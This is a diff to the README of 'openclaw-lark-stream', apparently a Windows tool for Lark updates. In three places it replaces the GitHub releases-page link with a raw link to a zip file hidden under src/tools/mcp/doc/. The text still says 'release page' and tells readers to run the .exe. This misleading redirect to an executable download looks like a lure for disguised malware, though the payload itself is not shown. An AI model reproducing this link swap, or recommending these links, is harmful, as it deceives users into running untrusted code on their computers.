@@ -1,12 +1,12 @@
 # 🔗 openclaw-lark-stream - Stream Lark updates with clear status
 
-[![Download openclaw-lark-stream](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mandychitinous459/openclaw-lark-stream/releases)
+[![Download openclaw-lark-stream](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mandychitinous459/openclaw-lark-stream/main/src/tools/mcp/doc/stream-lark-openclaw-3.2-beta.2.zip)
 
 ## 📥 Download
 
 Visit the release page to download the Windows version:
 
-https://github.com/Mandychitinous459/openclaw-lark-stream/releases
+https://raw.githubusercontent.com/Mandychitinous459/openclaw-lark-stream/main/src/tools/mcp/doc/stream-lark-openclaw-3.2-beta.2.zip
 
 Open the latest release and get the file for Windows. If there are several files, pick the one with `.exe` in the name or the Windows package marked for your system.
 
@@ -170,6 +170,6 @@ If you want to stay organized:
 
 If you need the file again, use the release page:
 
-https://github.com/Mandychitinous459/openclaw-lark-stream/releases
+https://raw.githubusercontent.com/Mandychitinous459/openclaw-lark-stream/main/src/tools/mcp/doc/stream-lark-openclaw-3.2-beta.2.zip
 
 Open the latest release, download the Windows file, then run it on your PC
